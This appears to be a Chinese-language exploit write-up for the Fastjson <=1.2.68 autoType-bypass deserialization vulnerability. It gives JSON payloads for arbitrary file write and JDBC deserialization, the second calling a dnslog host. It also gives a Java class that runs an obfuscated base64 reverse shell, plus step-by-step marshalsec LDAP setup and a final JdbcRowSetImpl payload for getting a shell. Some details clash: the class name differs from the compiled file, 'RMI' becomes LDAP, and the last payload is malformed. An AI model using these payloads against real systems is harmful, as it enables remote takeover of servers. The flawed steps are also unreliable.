## 漏洞概述

在Fastjson<=1.2.68的版本中，通过新的Gadgets绕过autoType开关，在autoType关闭的情况下仍然可以绕过黑白名单防御机制，通过反序列化漏洞在服务器上执行任意代码

## 影响范围

Fastjson爆出的绕过方法可以通杀 1.2.68 以下所有版本

```http
Fastjson <= 1.2.68
```

## POC

任意文件写入POC

```http
{"x":{"@type":"java.lang.AutoCloseable","@type":"sun.rmi.server.MarshalOutputStream","out":{"@type":"java.util.zip.InflaterOutputStream","out":{"@type":"java.io.FileOutputStream","file":"/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64/jre/lib/charsets.jar","append":false},"infl":{"input":"xxx"},"bufLen":1048576},"protocolVersion":1}}

{"x":{"@type":"java.nio.charset.Charset","val":"500"}}
```

JDBC反序列化POC

```http
{"@type":"java.lang.AutoCloseable", "@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"172.20.64.40","portToConnectTo":3306,"url":"jdbc:mysql://172.20.64.40:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","databaseToConnectTo":"test","info":{"@type":"java.util.Properties","PORT":"3306","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true","user":"yso_URLDNS_http://ahfladhjfd.6fehoy.dnslog.cn","PORT.1":"3306","HOST.1":"172.20.64.40","NUM_HOSTS":"1","HOST":"172.20.64.40","DBNAME":"test"}}
```

## 漏洞利用

1、编译POC

将代码编写为class类文件，并将生成的类文件放在web目录下，启动web服务

```java
public class exec{
    public static void main(String[] args) throws Exception
    {
        Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAveC54LngueC8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}").waitFor();
    }
}
//base64 是要执行的命令
```

```bash
#编译
javac POC.java
```

```bash
python3 -m http.server 8001
```

2、配置RMI环境

用marshalsec项目，启动一个RMI服务器，监听9999端口，并加载远程类

下载地址：https://github.com/mbechler/marshalsec 

安装maven

```bash
yum install -y maven 
```

切换到marshalsec目录下使用maven进行打包，

```bash
mvn clean package -DskipTests
```

3、开启监听

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://x.x.x.x:9999/#POC
```

备注：http://xx.xx.xx.xx:9999/#POC 是放Java类的地址，类只要写名字即可，不需要加.class，其次类名前要加#

4、反弹shell

把网站json数据包替换，然后发包，VPS即可收到

```http
{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap:// http://xx.xx.xx.xx:9999/#POC ","autoCommit":true}}}
```
